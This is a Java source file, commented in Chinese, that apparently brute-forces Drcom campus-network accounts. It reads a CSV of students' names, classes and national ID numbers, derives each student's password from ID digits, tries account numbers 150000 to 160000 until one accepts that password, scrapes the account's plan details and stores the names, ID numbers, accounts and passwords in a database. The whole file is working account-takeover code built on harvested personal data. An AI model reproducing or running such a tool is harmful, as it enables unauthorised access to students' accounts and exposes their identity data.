package main;

import java.io.*;
import java.nio.charset.StandardCharsets;
import java.sql.Connection;
import java.sql.PreparedStatement;
import java.sql.SQLException;

/**
 * @author vision
 * 从信息文件提取信息，调用爆破模块，将结果写入数据库
 */
public class DrcomBruteForcer {

    /**
     * 该静态方法调用DrcomBruteForce进行多线程爆破
     * @param password 密码
     * @return account
     */
    private static String bruteForce(String password) {
        // 初始爆破参数
        int begin = 150000;
        int end = 160000;

        // 执行爆破，因为多线程有超时异常，只是单线程执行
        Thread task = new Thread(new DrcomForceTask(begin, end, password));
        task.start();
        try {
            task.join();
        } catch (InterruptedException e) {
            System.out.println(e);
        }

        if (DrcomForceTask.account != null) {
            System.out.println("爆破成功，密码 " + password + " 找到账号 " + DrcomForceTask.account);
        } else {
            System.out.println("爆破失败，密码 " + password + " 未找到账号 ");
        }
        return DrcomForceTask.account;
    }

    /**
     * 将传入的一行学生信息解析，提取密码调用爆破
     * @param line 一组学生信息
     */
    private static void handleStudent(String line) {
        final int interval = 600000;
        Student student = null;
        String[] infos = line.split(",");

        // 保证身份证信息存在切格式正确，从已知身份证信息提取密码信息
        if (infos.length == 5 && infos[4].length() == 18) {
            String password;
            if (infos[4].endsWith("x") || infos[4].endsWith("X")) {
                password = infos[4].substring(9, 17);
            } else {
                password = infos[4].substring(10, 18);
            }

            // 统计时间
            long s = System.currentTimeMillis();

            // 开始爆破
            String account = bruteForce(password);

            long n = System.currentTimeMillis();
            int consume = (int) (n - s);

            // 爆破成功后，将账号、密码信息写入学生对象
            if (account != null) {
                student = new Student();
                student.setNumber(infos[0]);
                student.setName(infos[1]);
                student.setGender(infos[2]);
                student.setSclass(infos[3]);
                student.setIdcard(infos[4]);
                student.setAccount(account);
                student.setPassword(password);

                // 获取网络套餐信息
                try {
                    NetInfoCrawler.crawlNetInfo(student);
                } catch (IOException e) {
                    System.out.println(e);
                }

                // 数据库写入学生信息
                insertStudent(student);

                DrcomForceTask.account = null;
            }

            System.out.println("共耗时 " + consume / 1000 / 60 + " 分钟");

            // 等待间隔或继续爆破
            if (consume < interval) {
                try {
                    Thread.sleep(interval - consume);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }

        }
    }

    /**
     * 将学生信息写入数据库
     * @param student 学生
     */
    private static void insertStudent(Student student) {
        Connection con = null;
        try {
            con = DBConnection.getConnection();
            PreparedStatement statement = con.prepareStatement("INSERT INTO account VALUES(?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?) ");
            statement.setString(1, student.getNumber());
            statement.setString(2, student.getName());
            statement.setString(3, student.getGender());
            statement.setString(4, student.getSclass());
            statement.setString(5, student.getIdcard());
            statement.setString(6, student.getAccount());
            statement.setString(7, student.getPassword());
            statement.setString(8, student.getISP());
            statement.setString(9, student.getBandwidth());
            statement.setString(10, student.getStatus());
            statement.setString(11, student.getOverdate());

            statement.executeUpdate();
            System.out.println("写入 " + student.getNumber() + " 成功");
        } catch (ClassNotFoundException | SQLException e) {
            e.printStackTrace();
        } finally {
            if (con != null) {
                try {
                    con.close();
                } catch (SQLException e) {
                    e.printStackTrace();
                }
            }
        }

    }


    public static void main(String[] args) throws IOException {
        BufferedReader br = new BufferedReader(
                new InputStreamReader(
                        new FileInputStream("/root/Desktop/student.csv"),
                        StandardCharsets.UTF_8
                )
        );

        // 读取密码文件
        String line = br.readLine();
        while ((line = br.readLine()) != null) {
            handleStudent(line);
        }

        br.close();
     }
}
